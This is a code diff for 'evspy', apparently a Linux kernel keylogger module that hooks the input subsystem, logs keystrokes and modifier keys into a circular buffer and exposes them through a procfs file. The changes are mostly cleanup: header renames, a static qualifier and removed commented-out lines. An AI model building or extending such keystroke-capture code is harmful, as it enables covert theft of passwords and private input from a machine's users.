@@ -1,9 +1,7 @@
 /*
- *  Copyright (c) 2011 Guillermo Ramos <0xwille@gmail.com>
- *  based on evbug module by Vojtech Pavlik ((c) 1999-2001)
- */
-
-/*
+ *   Copyright (c) 2011 Guillermo Ramos <0xwille@gmail.com>
+ *   based on evbug module by Vojtech Pavlik ((c) 1999-2001)
+ *
  * This program is free software; you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation; either version 2 of the License, or
@@ -31,7 +29,8 @@
 #include <linux/string.h>
 #include <linux/cred.h>
 #include <linux/sched.h>
-#include "evspy.h"
+#include "evspy-core.h"
+#include "khashmap/khashmap.h"
 
 
 static char *buffer;		// circular buffer
@@ -47,7 +46,7 @@ static char sp_tag[] = "<+XXX>";
 /*
  * Executed when the procfs file is read (EVS_PROCNAME)
  */
-int evspy_read_proc(char *page, char **start, off_t offset, int count,
+static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 		int *eof, void *data)
 {
 	int n, toend;
@@ -124,8 +123,6 @@ static void special_char(unsigned int code, unsigned int value)
 	case KEY_LEFTSHIFT:
 		shift = !shift;
 		return;
-//		strncpy(sp_tag+2, "SFT", 3);
-//		break;
 	case KEY_LEFTALT:
 		strncpy(sp_tag+2, "ALT", 3);
 		break;
@@ -181,7 +178,6 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 
 	// If caps lock is pressed, handle it the same way as left shift
 	if (code == KEY_CAPSLOCK && value == EVS_VAL_PRESS) {
-//		capslock_state = !capslock_state;
 		special_char(KEY_LEFTSHIFT, capslock_state);
 		return;
 	} else if (type != EV_KEY || unlikely(code >= sizeof(EVS_MAP))) {
@@ -257,9 +253,10 @@ static struct input_handler evspy_handler = {
 static int __init evspy_init(void)
 {
 	create_proc_read_entry(EVS_PROCNAME, 0, NULL, evspy_read_proc, NULL);
+
 	buffer = kmalloc(EVS_BUFSIZE, GFP_KERNEL);
-	rdp = buffer;
-	wrp = buffer;
+	rdp = wrp = buffer;
+
 	return !buffer || input_register_handler(&evspy_handler);
 }
 
